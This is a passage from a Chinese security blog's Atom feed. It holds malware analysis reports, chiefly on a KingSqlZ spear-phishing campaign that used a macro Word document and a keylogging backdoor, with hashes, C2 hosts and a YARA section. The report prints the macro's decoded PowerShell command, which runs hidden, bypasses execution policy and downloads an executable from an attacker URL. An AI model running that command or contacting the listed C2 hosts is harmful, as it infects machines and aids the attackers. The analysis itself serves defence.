rel="external">https://github.com/DidierStevens/DidierStevensSuite/blob/master/decode-vbe.py</a><br>  <img src="http://hacky.wang/blog/20190823/vJFQ2KIScfM7.png?imageslim" alt="mark"></p></li><li><p>可以看出进行了Base64解密，然后将其写入UserImage.png文件，然后调用Powershell执行<br>  <img src="http://hacky.wang/blog/20190823/fL2aSJsYt7ji.png?imageslim" alt="mark"></p></li><li>将经过Base64加密的数据进行解密，得到一个解密的ps1脚本。<br>  <img src="http://hacky.wang/blog/20190823/t1apT8b88QMv.png?imageslim" alt="mark"></li><li>进过分析，发现主要执行了一下操作：<ul><li>1.获取系统基本信息：进程，系统名称，用户名称，GUID，并存储值log.txt和fl.txt并发送给C2:185.185.25.175<br><img src="http://hacky.wang/blog/20190823/A54OqRKnUsb5.png?imageslim" alt="mark"><br><img src="http://hacky.wang/blog/20190823/TQwrMYnI3PTA.png?imageslim" alt="mark"><br><img src="http://hacky.wang/blog/20190823/DiUEHuv5jyi3.png?imageslim" alt="mark"></li><li>2.<a href="http://185.185.25.175/sDownloads/下载ieee.dat到C:\Users\Public\GUID.JPRG，然后利用Powershell执行" target="_blank" rel="external">http://185.185.25.175/sDownloads/下载ieee.dat到C:\Users\Public\GUID.JPRG，然后利用Powershell执行</a><br><img src="http://hacky.wang/blog/20190823/f2lDuttR3tLb.png?imageslim" alt="mark"><br><img src="http://hacky.wang/blog/20190823/s9EkB4Ft4FKO.png?imageslim" alt="mark"></li></ul></li><li>经过对ieee.dat的分析，发现其是一个后门，不做具体分析</li><li>攻击链如下：<br>  <img src="http://hacky.wang/blog/20190823/6RKHcQLhjEIj.png?imageslim" alt="mark"></li><li>Ioc：36ccae4dffc70249c79cd3156de1cd238af8f7a3e47dc90a1c33476cf97a77b0</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x1-常见混淆&quot;&gt;&lt;a href=&quot;#0x1-常见混淆&quot; class=&quot;headerlink&quot; title=&quot;0x1 常见混淆&quot;&gt;&lt;/a&gt;0x1 常见混淆&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;基于大小写 ：hacky—&amp;gt;HaCky&lt;/li&gt;
&lt;li&gt;基于字符分割：’Ha’+’Cky’—&amp;gt;HaCky&lt;/li&gt;
&lt;li&gt;插入变量：’{0}{1}’-f ‘Ha’,’Kay’—&amp;gt;HaCky&lt;/li&gt;
&lt;li&gt;反引号：H`aCky—&amp;gt;HaCky&lt;/li&gt;
&lt;li&gt;基于命令转换(字符串转化为命令)&amp;amp;(HaCky)—&amp;gt;HaCky&lt;/li&gt;
&lt;li&gt;基于空格或者ASCII
    
    </summary>
    
      <category term="windows系统" scheme="https://findream.github.io/categories/windows%E7%B3%BB%E7%BB%9F/"/>
    
    
  </entry>
  
  <entry>
    <title>针对KingSqlZ组织一次攻击的分析报告</title>
    <link href="https://findream.github.io/2019/05/30/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF_21_%E9%92%88%E5%AF%B9KingSqlZ%E7%BB%84%E7%BB%87%E4%B8%80%E6%AC%A1%E6%94%BB%E5%87%BB%E7%9A%84%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/"/>
    <id>https://findream.github.io/2019/05/30/病毒分析技术_21_针对KingSqlZ组织一次攻击的分析报告/</id>
    <published>2019-05-30T07:02:11.000Z</published>
    <updated>2021-11-02T13:55:21.845Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x0-前言"><a href="#0x0-前言" class="headerlink" title="0x0 前言"></a>0x0 前言</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;近期，启明星辰ADLab监测到一批疑似针对西班牙语地区的政府机构及能源企业等部门的定向攻击活动。通过对攻击者的行为和所用服务器相关信息的分析和追踪，确定该次攻击来源于一批隐秘多年的土耳其黑客组织-KingSqlZ组织。该组织是一个民族主义色彩非常浓厚的黑客组织，曾攻下其他国家的3千多个网站服务器，并高调的在被攻击网站上留下其组织的名称，随后消失了多年。 如今通过研究人员的追踪再次挖出该黑客组织的活动迹象。此次攻击活动通过构造恶意Office Word文档并配合鱼叉邮件发起定向攻击，以“简历更新”作为诱饵文档向攻击目标植入间谍木马，从事情报收集、远控监视及系统破坏等恶意行动。在本次攻击过程中，该组织采用渗透手段攻下多台服务器并将其作为存放攻击代码的跳板。[转]<br><a id="more"></a></p><h1 id="0x1-目录"><a href="#0x1-目录" class="headerlink" title="0x1 目录"></a>0x1 目录</h1><ul><li>1.目录</li><li>2.IoC</li><li>3.行为分析</li><li>4.样本分析</li><li>5.yara规则</li><li>6.后记</li></ul><h1 id="0x2-IoC"><a href="#0x2-IoC" class="headerlink" title="0x2 IoC"></a>0x2 IoC</h1><h2 id="0x2-1-Hash"><a href="#0x2-1-Hash" class="headerlink" title="0x2.1 Hash"></a>0x2.1 Hash</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;本次一共截获了两个和<code>KingSqlZ</code>组织有关的可疑样本，其中有一个是一个doc样本，通过使用宏进行文件传播，IOC如下：</p><ul><li>样本名称：4fb43047463380ae25cb7684433f6a7e4f4b8b1669048291aca20182877a2810.doc</li><li>样本Hash：4fb43047463380ae25cb7684433f6a7e4f4b8b1669048291aca20182877a2810</li><li>样本类型：ole文件(带宏)</li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;另外一个是一个PE文件。IOC如下：</p><ul><li>样本名称：298ee13829733e23557b5f0db3d93768c0665260be17dc9010288d33ca6fe77f.exe</li><li>样本Hash：298ee13829733e23557b5f0db3d93768c0665260be17dc9010288d33ca6fe77f</li><li>是否加壳：无壳</li><li>编译语言：maybe C++ Visual Studio 201x or Asm demo/example  [DebuG]</li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;以及这两个样本释放的其他样本的IOC(不包括内存转储): </p><ul><li>2d69c9a9622b9b812db1833caec237995eedd0dee59ece53bd359e7083023f47</li><li>9211473ae545a0248b4ef4bb1bea1acffc1ec85ecb42194984266416720a7f73</li><li>c242bfb6aa6d47087d77d25955bd48a5421fb0353049828ec99d44e119874b7a</li><li>7a01dd19b5a74e7023d19a19065f49fb013c9f0f7fee974d717d46a8369b8e60</li></ul><h2 id="0x2-2-C2"><a href="#0x2-2-C2" class="headerlink" title="0x2.2 C2"></a>0x2.2 C2</h2><ul><li><a href="http://www.gestomarket.co/ylqrg54.exe" target="_blank" rel="external">http://www.gestomarket.co/ylqrg54.exe</a></li><li>asdfwrkhl.warzonedns.com</li><li>linksysdatakeys.se</li><li>67.228.235.93</li><li>187.136.91.177</li><li>187.155.84.184</li><li>31.13.73.17</li><li>67.228.235.93</li><li>31.13.73.23</li><li>74.86.228.110</li><li>187.155.84.184</li><li>69.171.239.11</li><li>187.155.47.67</li><li>66.220.147.47</li><li>31.13.86.1</li><li>31.13.75.17:2404</li><li>备注：这些主机本身不具备相关性，因为他们都是由于被该组织渗透成为该组织攻击的跳板</li></ul><h1 id="0x3-行为分析"><a href="#0x3-行为分析" class="headerlink" title="0x3 行为分析"></a>0x3 行为分析</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;名称统一使用Hash的前几个字符加后缀的方式命名。主要操作是远控类木马。<br>    <img src="http://hacky.wang/blog/20190530/zfiD0zF422xh.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20190530/NMcvDW1urtq1.png?imageslim" alt="mark"></p><h1 id="0x4-样本分析"><a href="#0x4-样本分析" class="headerlink" title="0x4 样本分析"></a>0x4 样本分析</h1><h2 id="0x4-1-4fb430-doc"><a href="#0x4-1-4fb430-doc" class="headerlink" title="0x4.1 4fb430.doc"></a>0x4.1 4fb430.doc</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;是一个doc宏病毒样本，通过使用oledump获取其中的宏代码。<br>    <img src="http://hacky.wang/blog/20190530/l2Ice0RMALU1.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;发现宏代码被混淆严重，去混淆结合沙箱的结果推测具体行为如下：</p><ul><li>宏代码调用cmd，解密其中的十进制数据。</li><li><p>接着调用powershell。下载massive.exe</p><figure class="highlight less"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">powershell</span><span class="selector-class">.exe</span> <span class="selector-tag">-w</span> <span class="selector-tag">hidden</span> <span class="selector-tag">-ep</span> <span class="selector-tag">bypass</span> (New-Object System.Net.WebClient)<span class="selector-class">.DownloadFile</span>(<span class="string">'http://www.gestomarket.co/ylqrg54.exe'</span>,$<span class="attribute">env</span>:temp + <span class="string">'\massive.exe'</span>);</div></pre></td></tr></table></figure></li><li><p>运行massive.exe</p></li></ul><h2 id="0x4-2-massive-exe"><a href="#0x4-2-massive-exe" class="headerlink" title="0x4.2 massive.exe"></a>0x4.2 massive.exe</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先这个样本是一个C#程序，使用ILSpy查看源代码。<br>    <img src="http://hacky.wang/blog/20190530/rkhvbmpQjVhj.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;将程序定位到关键的地方。发现这个样本也只是一个外壳程序，用于从攻击跳板上获取攻击代码，然后将其写入我们的内存中，从内存中执行攻击代码，实现了无文件落地，有效规避了查杀。<br>    <img src="http://hacky.wang/blog/20190530/u09pkDcBrOJm.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20190530/wR9hnpBJDbgA.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;使用进程替换技术，先创建一个和自身相同的子进程，然后使用进程替换进程，执行我们的攻击代码。但是由于C#不好被调试，所以将其子进程转储得到我们落地的攻击样本如下，命名为DumpFrommassive.exe<br>    <img src="http://hacky.wang/blog/20190530/mp7iQpXKuVJS.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20190530/2gGU9cAKIwzX.png?imageslim" alt="mark"></p><h2 id="0x4-3-DumpFrommassive-exe"><a href="#0x4-3-DumpFrommassive-exe" class="headerlink" title="0x4.3 DumpFrommassive.exe"></a>0x4.3 DumpFrommassive.exe</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;创建一个互斥体，然后获取多个API函数地址<br>    <img src="http://hacky.wang/blog/20190530/bUiMGz4QEXFt.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接着判断是否是X64系统，然后通过注册表<code>SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProductName</code>获取系统的版本信息。<br>    <img src="http://hacky.wang/blog/20190530/3oiXdAdSpEXy.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;当判断是xp系统，就去获取HKEY_CURRENT_USER\origmsc数据，但是分析机器上未发现这样的键。<br>    <img src="http://hacky.wang/blog/20190530/lKj49BU7dEGh.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;利用注册表HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System 关闭UAC通知<br>    <img src="http://hacky.wang/blog/20190530/ALsYol1VFhuN.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通过当前的环境变量获取特殊目录的路径<br>    <img src="http://hacky.wang/blog/20190530/lybJLCwmYw1P.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;获取目标进程的相关信息包括模块和32/64位进程，这个进程是由于注册表中的数据决定。<br>    <img src="http://hacky.wang/blog/20190530/wUI0RvgdTI3u.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;由于转储很多静态数据丢失，过于细节的数据没有办法复现。<br>    <img src="http://hacky.wang/blog/20190530/4BYRLn86fTlC.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20190530/LqlaGfeqXxjp.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20190530/Ue0MCgcw2SuL.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;由于该组织使用渗透的方式，得到多台服务器的控制权，让这些服务器充当此次攻击的跳板机和C2<br>    <img src="http://hacky.wang/blog/20190530/Ke9KPR9QMmPE.png?imageslim" alt="mark"><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通过设置键盘钩子的形式，记录键盘输入，和剪切板数据<br>    <img src="http://hacky.wang/blog/20190530/qD0A3MylalqU.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20190530/DxqaAw6ecywb.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20190530/7F5srRvuzn0v.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20190530/CGxKazGvJTT3.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;创建新线程，执行截图<br>    <img src="http://hacky.wang/blog/20190530/yR8IoRHbpfTh.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20190530/bwfBwvH3izqg.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20190530/NqOv2wDPzsuM.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20190530/MJ2nzNziucMo.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;创建新线程进行音视频传输<br>    <img src="http://hacky.wang/blog/20190530/NBjXKoTsQtxs.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;清空主流浏览器的COOKIE和保存的表单(账户和密码)，这样就可以在用户重新输入密码的时候记录下来。<br>    <img src="http://hacky.wang/blog/20190530/HCE8Qibkbqgn.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20190530/htwCe5roCz9E.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;获取用户名，机器名称，主要是识别作用<br>    <img src="http://hacky.wang/blog/20190530/eBifkMoWRjBW.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;关闭数据执行保护DEP<br>    <img src="http://hacky.wang/blog/20190530/Bfkpo0S2QVE4.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;执行后门远控操作，主要的行为有键盘记录，截图，视频，发送数据，联网下载数据，检索服务，创建开启服务，程序执行，傀儡进程，提权关机。</p><ul><li>提权关机<br>  <img src="http://hacky.wang/blog/20190530/FFjpLz4J43FX.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190530/pYLAhPk3gBQf.png?imageslim" alt="mark"></li><li>键盘记录<br>  <img src="http://hacky.wang/blog/20190530/mhIdck9OnGao.png?imageslim" alt="mark"></li><li>发送键盘输入数据<br>  <img src="http://hacky.wang/blog/20190530/oOK0pcOh4ihn.png?imageslim" alt="mark"></li><li>安装软件信息，并发送<br>  <img src="http://hacky.wang/blog/20190530/xTgtjda9jv14.png?imageslim" alt="mark"></li><li>从Internet上读取可执行的shellcode，并执行<br>  <img src="http://hacky.wang/blog/20190530/RY3FfWB9h30L.png?imageslim" alt="mark"></li><li>获取进程列表<br>  <img src="http://hacky.wang/blog/20190530/UIiP1XJeuXdw.png?imageslim" alt="mark"></li><li>利用管道实现和C2之间的数据交互<br>  <img src="http://hacky.wang/blog/20190530/ECdPKzU9Lxt9.png?imageslim" alt="mark"></li><li>截图<br>  <img src="http://hacky.wang/blog/20190530/X1nCzCbVrg03.png?imageslim" alt="mark"></li><li>键盘区域<br>  <img src="http://hacky.wang/blog/20190530/wtWgKpNdbMpJ.png?imageslim" alt="mark"></li><li>删除，清空文件<br>  <img src="http://hacky.wang/blog/20190530/BDFdEqEMSBTB.png?imageslim" alt="mark"></li><li>清空COOKIE和用户名密码<br>  <img src="http://hacky.wang/blog/20190530/vgx2dLTQ52uX.png?imageslim" alt="mark"></li><li>音视频<br>  <img src="http://hacky.wang/blog/20190530/HxEReejnTbhM.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190530/weGL22cJNAxS.png?imageslim" alt="mark"></li><li>从Internet上下载数据并执行<br>  <img src="http://hacky.wang/blog/20190530/MD6BA3jtt83K.png?imageslim" alt="mark"></li><li>获取服务相关信息<br>  <img src="http://hacky.wang/blog/20190530/7bKJHwCaBzoO.png?imageslim" alt="mark"></li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;综上，对此样本定性为<strong>后门远控类文件</strong>。</p><h2 id="0x4-4-298eeexe-exe"><a href="#0x4-4-298eeexe-exe" class="headerlink" title="0x4.4 298eeexe.exe"></a>0x4.4 298eeexe.exe</h2><ul><li>从<a href="http://www.gestomarket.co/hqpi64.exe下载文件，并执行" target="_blank" rel="external">http://www.gestomarket.co/hqpi64.exe下载文件，并执行</a><br>  <img src="http://hacky.wang/blog/20190530/CxyVqwMOJysO.png?imageslim" alt="mark"></li></ul><h2 id="0x4-5-2XC2DF0S-exe"><a href="#0x4-5-2XC2DF0S-exe" class="headerlink" title="0x4.5 2XC2DF0S.exe"></a>0x4.5 2XC2DF0S.exe</h2><ul><li>SHA256为2d69c9a9622b9b812db1833caec237995eedd0dee59ece53bd359e7083023f47，查壳是UPX的壳，ESP拖一下.<br>  <img src="http://hacky.wang/blog/20190530/2OIjOJJO2bjn.png?imageslim" alt="mark"></li><li>主要使用了SMC技术<br>  <img src="http://hacky.wang/blog/20190530/tDqH0qJrmyse.png?imageslim" alt="mark"></li><li><p>根据动态分析，可以得到样本创建了fyhgzmilgyvvgdu.exe和\「开始」菜单\程序\启动\创建fyhgzmilgyvvgdu.eu.url。创建url的目的是实现了fyhgzmilgyvvgdu.exe的自启动<br>  <img src="http://hacky.wang/blog/20190530/izfY42GDjtxG.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190530/PbEFY4NVxBxL.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190530/WARLNynOQVC7.png?imageslim" alt="mark"></p></li><li><p>创建自身子进程，并进行进程替换<br>  <img src="http://hacky.wang/blog/20190530/RTpRqfT9lrz4.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190530/v1XfIa4p0EgQ.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190530/Ar9bAD4GBcwQ.png?imageslim" alt="mark"></p></li><li>dump出傀儡进程的PE数据，命名为DumpFrom2d69exe.exe_<br>  <img src="http://hacky.wang/blog/20190530/XBHWFk2lgFEr.png?imageslim" alt="mark"></li></ul><h2 id="0x4-6-DumpFrom2d69exe-exe"><a href="#0x4-6-DumpFrom2d69exe-exe" class="headerlink" title="0x4.6 DumpFrom2d69exe.exe_"></a>0x4.6 DumpFrom2d69exe.exe_</h2><ul><li>首先样本会先链接到C2服务器<code>asdfwrkhl.warzonedns.com</code>，当确认链接上<code>asdfwrkhl.warzonedns.com</code>,此时会从C2上接收数据<br>  <img src="http://hacky.wang/blog/20190531/JnFcBdvpEuNj.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190531/LuJRzBbnOqD9.png?imageslim" alt="mark"></li><li>然后将自身路径写入SOFTWARE\_rptls注册表中，但是注意的是这个是从2XC2DF0S.exe转储出来的，所以原始的模块名应该是2XC2DF0S.exe。加载资源文件，然后有个函数是解密shellcode，然后在把加载入内存的资源文件作为参数传入，初步怀疑应该从内存中执行。这样有效避免了查杀。将资源文件命名为Resource.bin<br>  <img src="http://hacky.wang/blog/20190531/Np5Pu9zW5rXd.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190531/0LCl60fJ1Om7.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190531/wsmMrrrwPYBU.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190531/wm7wdh5PKRs9.png?imageslim" alt="mark"></li><li>直接就是一个后门程序的主体框架。主要包括三大类的功能，第一交流通信，第二，下载执行，第三，信息记录，第四，测试退出，第五驻留操作。<br>  <img src="http://hacky.wang/blog/20190531/3VhJKujgaWxF.png?imageslim" alt="mark"></li><li>第一：通信交流<br>  <img src="http://hacky.wang/blog/20190531/3zNC6Iv8TbyU.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190531/jHs9TptLnXU1.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190531/zoLRanmKhcXJ.png?imageslim" alt="mark"></li><li>第二：下载执行，但是由于分析的时候，没有处于攻击窗口期，所以没有办法了解到此次下载的是何种程序，然后加载了一些网络库，运行时库<br>  <img src="http://hacky.wang/blog/20190531/7GeLBDmIARA1.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190531/A2sUFO3xp63G.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190531/SzfW0vNHmgMX.png?imageslim" alt="mark"></li><li>第三：信息记录，主要是键盘记录，和常见的手段一样，使用了钩子技术，截获用户的键盘输入，并记录按键信息，把并发送个C2服务器<br>  <img src="http://hacky.wang/blog/20190531/bjEvbMaP086q.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190531/SPgBynQXWoWV.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190531/oezl9Ao1Mxjq.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190531/ia62OMkAyqt1.png?imageslim" alt="mark"></li><li><p>第四：结束退出，也就是，断开连接，终止线程，删除自身<br>  <img src="http://hacky.wang/blog/20190531/PYQS3fKxCVvl.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190531/9JBlteNf771m.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190531/t0Vcy7E3vTn3.png?imageslim" alt="mark"></p></li><li><p>第五：驻留操作。包含了释放资源，运行服务，添加用户等<br>  <img src="http://hacky.wang/blog/20190531/XTmksNUFolcU.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190531/ov8jtKnIDlq1.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190531/FhlkNdjSbCpI.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190531/T7fbWQtCDoet.png?imageslim" alt="mark"></p></li></ul><h2 id="0x4-7-Resource-bin"><a href="#0x4-7-Resource-bin" class="headerlink" title="0x4.7 Resource.bin"></a>0x4.7 Resource.bin</h2><ul><li>释放<code>C:\Users\hacky\AppData\Local\Temp\dismcore.dll</code>和<code>C:\Users\hacky\AppData\Local\Temp\ellocnak.xml</code><br>  <img src="http://hacky.wang/blog/20190531/OXR5A7GOrBVQ.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190531/3ERiffs6sFkT.png?imageslim" alt="mark"></li><li>然后调用C:\Windows\system32\pkgmgr.exe，安装安装KB929761更新包，可能目的是排除竞争者<br>  <img src="http://hacky.wang/blog/20190531/KXFIlim7xvcJ.png?imageslim" alt="mark"></li></ul><h2 id="0x4-8-dismcore-dll"><a href="#0x4-8-dismcore-dll" class="headerlink" title="0x4.8 dismcore.dll"></a>0x4.8 dismcore.dll</h2><ul><li>读取SOFTWARE\_rptls的值，这个是其实是2XC2DF0S.exe的路径，然后截取去文件名。检查进程列表中是否存在这样的进程，有则关闭，然后在重新创建一个进程即可！<br>  <img src="http://hacky.wang/blog/20190531/MCoNO1kE6J0A.png?imageslim" alt="mark"></li></ul><h1 id="0x5-yara规则编写"><a href="#0x5-yara规则编写" class="headerlink" title="0x5 yara规则编写"></a>0x5 yara规则编写</h1><ul><li>   <img src="http://hacky.wang/blog/20190601/YxECxIiG24Nw.png?imageslim" alt="mark"><h1 id="0x6-后记"><a href="#0x6-后记" class="headerlink" title="0x6 后记"></a>0x6 后记</h1>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;学习样本分析两年了，从最开始的简单的蠕虫到后来的勒索病毒，再到挖矿病毒，再到现在的APT样本。总结一下，样本分析最重要的是心细和心诚。心细不多说。何谓心诚，心诚则灵。对于样本，我们也需要有敬畏之心，需要刨根问题，也就是说，作为一个合格的病毒分析师，首先你需要判断文件黑白，但能够辨别黑白也只能给你打60分。如何成为一个优秀的病毒分析师?在于刨根问底，在于洞悉原理，不是简单的知道样本执行了什么操作。肉眼看到的仅仅都只是表面现象。就像这个样本那个宏一样，肉眼可见其实释放了一个exe，但是他是怎么释放的呢？你一概不知，这样你可能就失去了一个可靠的情报，或者说你很有可能凭借这过于自信的判断。导致<strong>你对这样本的判断是错误的.</strong>但是这对于用户来说是致命的。</li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;专科学技术，本科学原理，博硕学辩证。对之于样本分析同，仅仅是懂得辩黑白仅仅就是专科的水平，不屑于言之，若能明晓原理，可达登堂入室之功，最后是辩证，也就是知道为何这样做是可行的，这样做是不可行的，不可行之处在于何处。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x0-前言&quot;&gt;&lt;a href=&quot;#0x0-前言&quot; class=&quot;headerlink&quot; title=&quot;0x0 前言&quot;&gt;&lt;/a&gt;0x0 前言&lt;/h1&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;近期，启明星辰ADLab监测到一批疑似针对西班牙语地区的政府机构及能源企业等部门的定向攻击活动。通过对攻击者的行为和所用服务器相关信息的分析和追踪，确定该次攻击来源于一批隐秘多年的土耳其黑客组织-KingSqlZ组织。该组织是一个民族主义色彩非常浓厚的黑客组织，曾攻下其他国家的3千多个网站服务器，并高调的在被攻击网站上留下其组织的名称，随后消失了多年。 如今通过研究人员的追踪再次挖出该黑客组织的活动迹象。此次攻击活动通过构造恶意Office Word文档并配合鱼叉邮件发起定向攻击，以“简历更新”作为诱饵文档向攻击目标植入间谍木马，从事情报收集、远控监视及系统破坏等恶意行动。在本次攻击过程中，该组织采用渗透手段攻下多台服务器并将其作为存放攻击代码的跳板。[转]&lt;br&gt;
    
    </summary>
    
      <category term="windows安全" scheme="https://findream.github.io/categories/windows%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
</feed>
